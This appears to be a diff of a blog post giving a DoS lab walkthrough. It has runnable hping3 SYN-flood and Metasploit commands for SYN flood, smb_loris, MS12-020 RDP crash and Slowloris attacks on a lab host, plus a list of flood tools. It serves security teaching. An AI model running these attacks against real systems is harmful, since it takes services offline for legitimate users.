@@ -1,117 +1,131 @@
 ---
-Layout: post
-Title: "Denial of Service (DoS) Lab Guide"
-Date: 2025-12-12 10:00:00 +0700
-Categories: [Hacking]
-
+layout: post
+title: "Denial of Service (DoS) Lab Guide"
+date: 2025-12-12 10:00:00 +0700
+categories: [Hacking]
+tags: [DoS, Metasploit, hping3, Slowloris, Impulse, Xerxes, security]
+toc: true
+pin: true
+excerpt: "Step-by-step walkthrough of common DoS attack techniques and lab exercises."
 ---
+
 # Understanding Denial of Service (DoS) Attacks
+{: #overview}
+
+This guide collects the most common DoS (Denial of Service) techniques tested in a controlled laboratory environment. Sections include network‑layer floods, application‑layer abuses, and recommended tools for practise. Always conduct experiments on systems you own or are authorized to test.
 
 ## 1. Overview of DoS Attacks
 
-Denial of Service (DoS) is a type of attack on a computer system or network aimed at reducing, restricting, or preventing legitimate users from accessing system resources.
+Denial of Service (DoS) is any attempt to make a machine or network resource unavailable to its intended users. Attackers consume bandwidth, memory or processing power by sending an overwhelming volume of malicious or malformed requests.
 
-* **Mechanism:** The attacker floods the victim's system with invalid service requests or virtual traffic to overload resources.
-
-* **Impact:** Includes reputational damage, network downtime, financial losses, and business operational disruption.
+- **Mechanism:** Flooding the victim with traffic, exploiting protocol weaknesses, or holding connections open indefinitely.
+- **Impact:** Reputational damage, service interruptions, financial loss and potential collateral damage to third parties.
 
 ---
 
 ## 2. Lab Procedures
 
+<a id="tcp-syn-flood"></a>
 ### A. TCP SYN Flood
-This attack exploits the TCP 3-way handshake to exhaust the target's connection resources.
+This classic network‑layer attack forces the victim to allocate state for half‑open TCP connections until resources are exhausted.
 
-#### Method 1: Using Metasploit
-* **Step 1:** Scan open ports using **Nmap**.
+#### Method 1: Metasploit
+1. Scan for open ports: `nmap -sS -Pn -p- 192.168.111.112`
+2. Launch the auxiliary module:
+   ```bash
+   use auxiliary/dos/tcp/synflood
+   set RHOSTS 192.168.111.112
+   run
+   ```
+3. Features include optional spoofed source addresses and adjustable packet rate.
 
-* **Step 2:** Use the `auxiliary/dos/tcp/synflood` module.
+> **Tip:** Run Wireshark/tcpdump on the target or a mirror port to observe the SYN packets.
 
-* **Features:** Supports random source IP spoofing.
+#### Method 2: hping3
+Send a stream of SYN packets with random source addresses:
+```bash
+hping3 -S -p 3389 --rand-source --flood 192.168.111.112
+```
 
-* **Note:** Start Wireshark or tcpdump before the attack to observe packets.
-
-#### Method 2: Using hping3
-Execution command syntax:
-`hping3 -S -p 3389 --rand-source --flood 192.168.111.112`
-
-**Explanation of Options:**
-
-| Parameters | Meaning |
-
-| `-S` | Synchronous scan (SYN scan) |
-
-| `-a` | Spoofing with a fixed source address |
-
-| `--rand-source` | Spoofing with multiple random source IP addresses |
-
-| `-p` | Target port (Example: 22 for SSH, 3389 for RDP) |
-
-| `--flood` | Sending packets continuously at maximum speed (flood) |
-
----
-
-### B. SMB Service DoS - Memory DoS (Metasploit)
-Attacks the shared file service (SMB) to exhaust the target system's memory.
-
-1. **On the Kali machine:** Increase the limit on the number of files opened simultaneously:
-
-`ulimit -n 65535` or `ulimit -n unlimited`.
-
-2. **Using Metasploit:**
-
-- `use auxiliary/dos/smb/smb_loris`
-
-- `set RHOST 192.168.111.112`
-
-- `run`
-3. **Verification:** On a Windows 7 machine, open **Task Manager > Performance** to observe resources.
+| Parameter         | Description                                           |
+|------------------|-------------------------------------------------------|
+| `-S`             | Set SYN flag (SYN scan)                               |
+| `-a <addr>`      | Spoof source address                                  |
+| `--rand-source`  | Use random source IP for each packet                  |
+| `-p <port>`      | Target port (e.g. `22` for SSH, `3389` for RDP)       |
+| `--flood`        | Send packets as fast as possible (no replies expected)|
 
 ---
 
-### C. DoS Attack on RDP service (Windows 7)
-Exploits the MS12-020 vulnerability to cause system errors (Blue Screen of Death - BSOD).
+### B. SMB Service DoS – Memory Exhaustion (Metasploit)
+The `smb_loris` module repeatedly opens and holds SMB file handles until the server runs out of memory.
 
-* **Module:** `auxiliary/dos/windows/rdp/ms12_020_maxchannelids`.
-
-* **Requirements:** The target machine is unpatched and Remote Desktop (RDP) is enabled.
-
-* **Result:** The system will crash (BSOD) if the vulnerability is present.
+1. Prepare the attacker (Kali) by raising file descriptor limits:
+   ```bash
+   ulimit -n 65535   # or unlimited
+   ```
+2. In Metasploit:
+   ```bash
+   use auxiliary/dos/smb/smb_loris
+   set RHOSTS 192.168.111.112
+   run
+   ```
+3. On the Windows target, open **Task Manager → Performance** to watch memory climb.
 
 ---
 
-### D. HTTP Slowloris - Application Layer Attack (L7)
-This technique keeps HTTP connections open by sending incomplete requests, exhausting the Web Server's connection pool.
+---
 
-#### Execution via Metasploit
-* **Module:** `auxiliary/dos/http/slowloris`.
+### C. DoS Attack on RDP Service (Windows 7)
+Targets unpatched Windows 7 machines by abusing MS12-020, which mishandles channel IDs in RDP.
 
-* **Mechanism:** Monopolizes all available connections, causing the Web Server to reject new connections.
+- **Metasploit module:** `auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
+- **Preconditions:** Target must have RDP enabled and not patched.
 
-* **Testing:** Tested on **IIS (Win7)** and **Apache (Metasploitable2)**. Check website accessibility after 15-30 seconds.
+Running the module sends specially crafted RDP messages; vulnerable hosts may crash with a BSOD.
 
-#### Performed via OWASP DoS Tool
-1. **Monitoring:** Access `http://[IP_M2]/server-status` on machine M2 to see empty slots (the dot `.`).
+---
 
-2. **Supervising:** Use the `top` command on machine M2 to monitor CPU Idle.
+---
 
-3. **Execution:** Run **HTTP Dos Tool 4.0** on a Windows 7 machine.
+### D. HTTP Slowloris – Application Layer Attack (L7)
+Slowloris maintains a large number of partial HTTP connections to a web server, preventing it from accepting new clients.
 
-4. **Result:** When the connection pool is full (displays the letter `R`), the website will be inaccessible.
+#### Via Metasploit
+```bash
+use auxiliary/dos/http/slowloris
+set RHOSTS 192.168.111.112
+run
+```
+> Tested successfully against IIS on Windows 7 and Apache on Metasploitable‑2. The service becomes unresponsive within 15‑30 seconds.
+
+#### OWASP HTTP DoS Tool
+1. Monitor the server with `http://[IP_M2]/server-status` – look for dots (`.`) indicating available slots.
+2. Run `top` on the target to watch CPU Idle drop.
+3. Execute **HTTP Dos Tool 4.0** on a Windows 7 host.
+4. Once all connection slots show `R` (receiving), the site stops responding to new requests.
+
+---
 
 ---
 
 ## 3. Other Popular DoS Tools
 
-| Tool Name | Characteristics | References |
-
-| :--- | :--- | :--- |
-
-| **Impulse** | Combines multiple DoS attack techniques | [GitHub](https://github.com/LimerBoy/Impulse) |
-
-| **Xerxes** | Powerful HTTP Attack Tool | [GitHub](https://github.com/zanyarjamal/xerxes) |
-
-| **HULK** | HTTP Attack on Unbearable Load King | [Packet Storm](https://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html) |
+| Tool Name | Description | Reference |
+|-----------|-------------|-----------|
+| **Impulse** | GUI program incorporating multiple DoS techniques (UDP, SYN, HTTP) | [GitHub](https://github.com/LimerBoy/Impulse) |
+| **Xerxes** | Lightweight HTTP flood program written in C | [GitHub](https://github.com/zanyarjamal/xerxes) |
+| **HULK** | HTTP Unbearable Load King – randomizes headers to bypass caching | [Packet Storm](https://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html) |
 
 ---
-*Note: This document is for educational and testing purposes only in a safe simulated environment.*
+
+## 4. Lab Questions
+
+1. What distinguishes a network-layer flood from an application-layer DoS?
+2. Why should DoS testing be confined to lab environments?
+3. How can you mitigate a SYN flood on a server?
+4. What are the ethical concerns of DoS attacks?
+
+---
+
+> **Disclaimer:** This material is intended for learning and authorized testing only. Never use DoS techniques against systems without explicit permission.
